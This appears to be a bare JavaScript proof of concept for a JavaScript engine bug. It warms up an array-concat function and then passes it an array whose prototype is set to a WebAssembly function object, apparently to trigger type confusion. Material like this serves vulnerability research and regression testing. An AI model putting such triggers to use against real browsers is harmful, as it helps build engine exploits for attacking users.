const wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 5, 1, 1, 102, 0, 0, 10, 4, 1, 2, 0, 11]);
const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule);
const wasmObject = wasmInstance.exports.f;

function poc(array) {
  return array.concat([1]);
}

for (let i = 0; i < 10000; i++) {
  poc([]);
}

let triggered = false;
if (!triggered) {
  const victim = [];
  Reflect.setPrototypeOf(victim, wasmObject);
  poc(victim);
  triggered = true;
}